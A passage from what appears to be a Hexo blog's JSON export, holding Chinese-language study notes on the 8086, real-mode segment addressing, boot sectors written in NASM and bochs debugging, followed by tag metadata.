title=\"x86实模式&amp;保护模式\"></a>x86实模式&amp;保护模式</h1><h2 id=\"我的github项目-https-github-com-busizhiya-x86-Assembly-learning\"><a href=\"#我的github项目-https-github-com-busizhiya-x86-Assembly-learning\" class=\"headerlink\" title=\"我的github项目~https://github.com/busizhiya/x86-Assembly-learning\"></a>我的github项目~<a href=\"https://github.com/busizhiya/x86-Assembly-learning\">https://github.com/busizhiya/x86-Assembly-learning</a></h2><h2 id=\"001-简述\"><a href=\"#001-简述\" class=\"headerlink\" title=\"001 简述\"></a>001 简述</h2><h3 id=\"学习目的\"><a href=\"#学习目的\" class=\"headerlink\" title=\"学习目的:\"></a>学习目的:</h3><p>1.了解解计算机的底层原理,如何与硬件沟通,不只是汇编原理<br>        2.学习计算机工作远离,8086实模式,保护模式、特权级、分页、多任务、任务切换<br>        3.打下好基础,提升对计算机系统、操作系统的认识</p>\n<h2 id=\"002-计算机的概述\"><a href=\"#002-计算机的概述\" class=\"headerlink\" title=\"002 计算机的概述\"></a>002 计算机的概述</h2><h3 id=\"003加法器\"><a href=\"#003加法器\" class=\"headerlink\" title=\"003加法器\"></a>003加法器</h3><h3 id=\"004用电表示数\"><a href=\"#004用电表示数\" class=\"headerlink\" title=\"004用电表示数\"></a>004用电表示数</h3><p>​        开关/电平高低</p>\n<h3 id=\"005寄存器-锁存器\"><a href=\"#005寄存器-锁存器\" class=\"headerlink\" title=\"005寄存器/锁存器\"></a>005寄存器/锁存器</h3><p>​        锁存,保存数据:触发器</p>\n<h3 id=\"006带寄存器的加法机\"><a href=\"#006带寄存器的加法机\" class=\"headerlink\" title=\"006带寄存器的加法机\"></a>006带寄存器的加法机</h3><p>准备输入A,按下预置,将数字A存入寄存器</p>\n<p>准备输入B,点击相加,将寄存器中内容与B相加</p>\n<p>…</p>\n<p>无论何时,加法器的输出为寄存器</p>\n<h3 id=\"007四则运算电路\"><a href=\"#007四则运算电路\" class=\"headerlink\" title=\"007四则运算电路\"></a>007四则运算电路</h3><p>预置,锁存</p>\n<p>加、减、乘、除</p>\n<p>将输入与寄存器中内容进行运算,存回寄存器</p>\n<p>将运算结果存回寄存器以达到连续运算的效果</p>\n<h3 id=\"008机器指令\"><a href=\"#008机器指令\" class=\"headerlink\" title=\"008机器指令\"></a>008机器指令</h3><p>在进行复杂运算时,会产生多个中间结果无法直接参与运算,因此设置多个寄存器</p>\n<p>在可以选择的情况下,机器指令就诞生了</p>\n<p>发送不同的指令执行不同的操作</p>\n<h3 id=\"009内存\"><a href=\"#009内存\" class=\"headerlink\" title=\"009内存\"></a>009内存</h3><h4 id=\"用地址-编号-区分内存\"><a href=\"#用地址-编号-区分内存\" class=\"headerlink\" title=\"用地址(编号)区分内存\"></a>用地址(编号)区分内存</h4><p>n根地址总线        可寻址范围0~2^n-1          共2^n个地址</p>\n<p>8 Bits=1Byte</p>\n<p>每个内存单元长度为1Byte</p>\n<p>进位2^10=1024</p>\n<p>B-&gt;KB-&gt;MB-&gt;GB-&gt;TB-&gt;PB…</p>\n<h4 id=\"数据总线传输数据\"><a href=\"#数据总线传输数据\" class=\"headerlink\" title=\"数据总线传输数据\"></a>数据总线传输数据</h4><h4 id=\"控制总线\"><a href=\"#控制总线\" class=\"headerlink\" title=\"控制总线\"></a>控制总线</h4><p>发送读、写操作</p>\n<h3 id=\"010自动计算\"><a href=\"#010自动计算\" class=\"headerlink\" title=\"010自动计算\"></a>010自动计算</h3><p>指令指针寄存器</p>\n<p>指令计数器</p>\n<p>操作码-操作数</p>\n<p>立即数-&gt;操作数包含在指令中</p>\n<p>停机指令</p>\n<h2 id=\"011处理器的历史\"><a href=\"#011处理器的历史\" class=\"headerlink\" title=\"011处理器的历史\"></a>011处理器的历史</h2><p>控制部分,    IO部分,    运算、存储部分</p>\n<p>n位的处理器有n位的寄存器和ALU</p>\n<h4 id=\"指令集ISA\"><a href=\"#指令集ISA\" class=\"headerlink\" title=\"指令集ISA:\"></a>指令集ISA:</h4><p>1.算术、逻辑运算</p>\n<p>2.数据传送指令</p>\n<p>3.处理器状态指令</p>\n<h2 id=\"012-汇编语言的诞生\"><a href=\"#012-汇编语言的诞生\" class=\"headerlink\" title=\"012 汇编语言的诞生\"></a>012 汇编语言的诞生</h2><p>抽象化,更简单,容易书写</p>\n<p>需要将汇编语言翻译为机器指令</p>\n<h3 id=\"013认识8086\"><a href=\"#013认识8086\" class=\"headerlink\" title=\"013认识8086\"></a>013认识8086</h3><p>​    AX、BX、CX、DX、SI、DI、BP、SP</p>\n<p>​        X(16)-&gt;H(8) L(8)</p>\n<p>AX由AH和AL组成</p>\n<p>最高位15 14 13…1 0最低位</p>\n<p>每一个16进制代表四个二进制</p>\n<p>1Word=2Bytes</p>\n<h3 id=\"014-8086的内存访问和字节序\"><a href=\"#014-8086的内存访问和字节序\" class=\"headerlink\" title=\"014 8086的内存访问和字节序\"></a>014 8086的内存访问和字节序</h3><p>​    高位在高地址,低位在低地址        -&gt; 低端字节序</p>\n<p>​    16位寄存器占用两个内存单元</p>\n<p>​    数据总线为16位,当传输8位时,高8位不用</p>\n<h3 id=\"015-程序的分段\"><a href=\"#015-程序的分段\" class=\"headerlink\" title=\"015 程序的分段\"></a>015 程序的分段</h3><p>占据连续的区段,称为代码/数据段</p>\n<h3 id=\"016程序重定位\"><a href=\"#016程序重定位\" class=\"headerlink\" title=\"016程序重定位\"></a>016程序重定位</h3><p>IPR=当前指令地址+当前指令长度</p>\n<p>如果在编写程序时使用固定地址(绝对地址/物理地址),当程序加载地址不同时,取得的数据就不一样,无法重定位.</p>\n<p>所以使用相对定位的方式,相对于数据段的地址进行偏移</p>\n<h3 id=\"017-段地址-amp-偏移地址\"><a href=\"#017-段地址-amp-偏移地址\" class=\"headerlink\" title=\"017 段地址&amp;偏移地址\"></a>017 段地址&amp;偏移地址</h3><p>每次加载程序时,程序会定位段地址,我们则使用相对的偏移地址,这样就不需要改动程序的地址了~</p>\n<p>程序开始时,将起始代码段地址传送到IPR</p>\n<p>将数据段地址传送到DSR</p>\n<p>DSR+偏移地址    的内存</p>\n<h3 id=\"018-8086在访问内存的困境\"><a href=\"#018-8086在访问内存的困境\" class=\"headerlink\" title=\"018 8086在访问内存的困境\"></a>018 8086在访问内存的困境</h3><p>​    有20根地址线(1M),但只有16位的寄存器</p>\n<p>​    CS Code Segment,代码段寄存器</p>\n<p>​    DS Data Segment,数据段寄存器</p>\n<h3 id=\"019-8086段地址选择策略\"><a href=\"#019-8086段地址选择策略\" class=\"headerlink\" title=\"019 8086段地址选择策略\"></a>019 8086段地址选择策略</h3><p>​    只有以0结尾的地址才能成为段地址,并且要向右移一位</p>\n<p>​    ‘30CE0’  -&gt; DS  -&gt; ’30CE‘</p>\n<p>​    这样就保证了20位的访问范围</p>\n<h3 id=\"020-8086的内存访问过程\"><a href=\"#020-8086的内存访问过程\" class=\"headerlink\" title=\"020 8086的内存访问过程\"></a>020 8086的内存访问过程</h3><p>​    将CS、DS赋值为起始地址(16进制)右移一位(除以16)</p>\n<p>​    在访问内存时将段地址向左移动一位(16进制),再加上段偏移地址得到实际的地址</p>\n<h3 id=\"021-逻辑地址和分段地址的灵活性\"><a href=\"#021-逻辑地址和分段地址的灵活性\" class=\"headerlink\" title=\"021 逻辑地址和分段地址的灵活性\"></a>021 逻辑地址和分段地址的灵活性</h3><p>​        段地址:偏移地址 e.g 65C7:0003    逻辑地址</p>\n<p>​        22567</p>\n<p>​        2256:0007</p>\n<p>​        2255:0017</p>\n<p>​        …</p>\n<p>​        1257:FFF7</p>\n<p>​        一个段的长度最大是2^16,64K</p>\n<h3 id=\"022-略\"><a href=\"#022-略\" class=\"headerlink\" title=\"022 略\"></a>022 略</h3><h3 id=\"023-创建汇编语言源程序\"><a href=\"#023-创建汇编语言源程序\" class=\"headerlink\" title=\"023 创建汇编语言源程序\"></a>023 创建汇编语言源程序</h3><p>本人使用MacOs环境,</p>\n<p>使用nasm作为编译器</p>\n<p>使用Sublime Text作为编辑器,使用插件</p>\n<p>​    插件:</p>\n<p>​                <a href=\"https://blog.csdn.net/liuchuo/article/details/51987174\">汇编高亮</a></p>\n<p>​                16进制查看器<a href=\"https://facelessuser.github.io/HexViewer/\">HexViewer</a></p>\n<p>1.编写代码2.编译.obj文件3.链接形成二进制文件4.执行</p>\n<p>;注释</p>\n<h3 id=\"024-029-环境配置-略\"><a href=\"#024-029-环境配置-略\" class=\"headerlink\" title=\"024~029 环境配置,略\"></a>024~029 环境配置,略</h3><h3 id=\"030-8086加电、复位状态\"><a href=\"#030-8086加电、复位状态\" class=\"headerlink\" title=\"030 8086加电、复位状态\"></a>030 8086加电、复位状态</h3><p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt5ssfcs8aj319g0u0ade.jpg\" alt=\"截屏2021-08-05 下午12.26.04\"></p>\n<h3 id=\"031-8086地址空间分配\"><a href=\"#031-8086地址空间分配\" class=\"headerlink\" title=\"031 8086地址空间分配\"></a>031 8086地址空间分配<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt5t3d1k23j319g0u0dis.jpg\" alt=\"截屏2021-08-05 下午12.36.34\"></h3><p>由于复位后cs为FFFF,所以开机后首先执行的就是FFFF:0000,即BIOS所在内存处</p>\n<h3 id=\"032-跳转指令\"><a href=\"#032-跳转指令\" class=\"headerlink\" title=\"032 跳转指令\"></a>032 跳转指令</h3><p>开机后读取的地址为FFFF0,离末端FFFFF只有16字节,所以这里存放的都是跳转指令</p>\n<p>除非发生跳转,处理器执行顺序都是由低地址向高地址执行</p>\n<p>JMP     0xF000:0xE05B</p>\n<p>JMP    段地址:偏移地址</p>\n<h3 id=\"033-硬盘构造和原理\"><a href=\"#033-硬盘构造和原理\" class=\"headerlink\" title=\"033 硬盘构造和原理\"></a>033 硬盘构造和原理</h3><p>Round Per Minute</p>\n<p>盘片两面都有磁头,从第一个盘片的上面为磁头0,下面为磁头1,第二个盘片上面为磁头2,下面为磁头3</p>\n<p>磁头绕一圈就是一个磁道</p>\n<p>每个盘片的同一磁道形成一个竖着的圆柱,称为柱面,从边缘向圆心从0变大</p>\n<p>为了加速,尽量不移动柱面,上一磁道写满向下一磁道写</p>\n<p>将磁道看成一个圆被切开,每一块就是一个扇区,为512Bytes,通常63个扇区,从1开始编号</p>\n<p>每个扇区间都有空隙</p>\n<h3 id=\"034-从主引导扇区开始\"><a href=\"#034-从主引导扇区开始\" class=\"headerlink\" title=\"034 从主引导扇区开始\"></a>034 从主引导扇区开始</h3><p>ROM BIOS最后会将硬盘中的主引导扇区读到07C00处,然后跳转到那里执行</p>\n<p>0盘面0磁道1扇区为主引导扇区</p>\n<p>接力执行</p>\n<h3 id=\"035-036-virtual-Box安装-略\"><a href=\"#035-036-virtual-Box安装-略\" class=\"headerlink\" title=\"035~036 virtual Box安装.略\"></a>035~036 virtual Box安装.略</h3><h3 id=\"037-虚拟硬盘-VHD\"><a href=\"#037-虚拟硬盘-VHD\" class=\"headerlink\" title=\"037 虚拟硬盘(VHD)\"></a>037 虚拟硬盘(VHD)</h3><h3 id=\"043-创建主引导扇区程序\"><a href=\"#043-创建主引导扇区程序\" class=\"headerlink\" title=\"043 创建主引导扇区程序\"></a>043 创建主引导扇区程序</h3><p>​    主引导扇区为512Byte,最后两个字节必须是0x55,0xAA</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;...</span><br><span class=\"line\">times 502 db 0;重复502次定义单个空字节</span><br><span class=\"line\">db 0x55</span><br><span class=\"line\">db 0xAA</span><br></pre></td></tr></table></figure>\n\n<p>LBA逻辑地址块</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt643qk4osj319g0u0gws.jpg\" alt=\"截屏2021-08-05 下午6.57.34\"></p>\n<h3 id=\"045调试观察\"><a href=\"#045调试观察\" class=\"headerlink\" title=\"045调试观察\"></a>045调试观察</h3><p>RAX</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt652d1t0fj319g0u0wgu.jpg\" alt=\"截屏2021-08-05 下午7.30.51\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bochs调试</span><br><span class=\"line\">b 0x7c00  在此处下端点</span><br><span class=\"line\">c  执行到断点停止</span><br><span class=\"line\">s\t 执行下一条指令</span><br><span class=\"line\">xp &#x2F;512xb 0x7c00 以十六进制的方式,以字节为单位显示512个单位个内存地址0x7c00的内容</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><code>$</code>的意思是“这里的地址”。</p>\n<p><code>$$</code>的意思是“当前部分的开头地址”。</p>\n<p>所以<code>$-$$</code>的意思是“当前大小的部分”。    </p>\n<h3 id=\"047-显卡-amp-显存\"><a href=\"#047-显卡-amp-显存\" class=\"headerlink\" title=\"047 显卡&amp;显存\"></a>047 显卡&amp;显存</h3><p>通过更改显存中的数据,控制单个像素</p>\n<p>显卡两种工作模式</p>\n<p>​        文本模式,图像模式</p>\n<p>显存被映射到内存空间中B000~BFFF,(32K)</p>\n<p>一个文字需要两个字节,字符编码和显示属性</p>\n<p>字符编码使用ASCII编码</p>\n<p>显示属性如下<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt66ywvqblj319g0u0tbu.jpg\" alt=\"截屏2021-08-05 下午8.36.45\"></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt673w3u0tj319g0u0tce.jpg\" alt=\"截屏2021-08-05 下午8.41.31\"></p>\n<h3 id=\"051MOV指令的形式和机器码\"><a href=\"#051MOV指令的形式和机器码\" class=\"headerlink\" title=\"051MOV指令的形式和机器码\"></a>051MOV指令的形式和机器码</h3><p>MOV 目的,源</p>\n<p>宽度必须相同</p>\n<p>两个操作数不能同时是地址</p>\n<p>段寄存器不能直接用立即数修改</p>\n<p>不能修改IP寄存器</p>\n<p>使用<code>nasm a.asm -l a.lst</code>生成列表文件,有<strong>汇编地址</strong>,汇编语句,机器码对应阅读</p>\n<h3 id=\"053-使用标号\"><a href=\"#053-使用标号\" class=\"headerlink\" title=\"053 使用标号\"></a>053 使用标号</h3><p>sign:</p>\n<p><code>times 510-(current-start) db 0</code></p>\n<h3 id=\"054-段间直接绝对跳转指令\"><a href=\"#054-段间直接绝对跳转指令\" class=\"headerlink\" title=\"054 段间直接绝对跳转指令\"></a>054 段间直接绝对跳转指令</h3><p>​    jmp    段地址:偏移地址</p>\n<p>​    注意:此操作会修改段寄存器</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ckn1g92d30000d0vz3g030hxq","tag_id":"ckn1g92d80001d0vzbtxndyjh","_id":"ckn1g92db0002d0vz4a2oe5al"},{"post_id":"ckn2yk7wl0000nevzb54y1k5q","tag_id":"ckn1g92d80001d0vzbtxndyjh","_id":"ckn2ypxhl00009avzdyfx31tk"},{"post_id":"cknbshdmw0000vkvza6v3dseh","tag_id":"cknbshdn20001vkvzd9zt8kcr","_id":"cknbshdn40002vkvz89tlhmrf"},{"post_id":"cks0fwib500009t7fg3ql0yjx","tag_id":"cks0fwibb00029t7f4jz23152","_id":"cks0fwibd00049t7f8q9khsmc"},{"post_id":"cks0fwiba00019t7f4opk0ew5","tag_id":"cks0fwibd00039t7f17kr1dnw","_id":"cks0fwibd00059t7fees28anp"}],"Tag":[{"name":"编程","_id":"ckn1g92d80001d0vzbtxndyjh"},{"name":"SUID 渗透测试","_id":"cknbshdn20001vkvzd9zt8kcr"},{"name":"打靶","_id":"cks0fwibb00029t7f4jz23152"},{"name":"OS","_id":"cks0fwibd00039t7f17kr1dnw"}]}}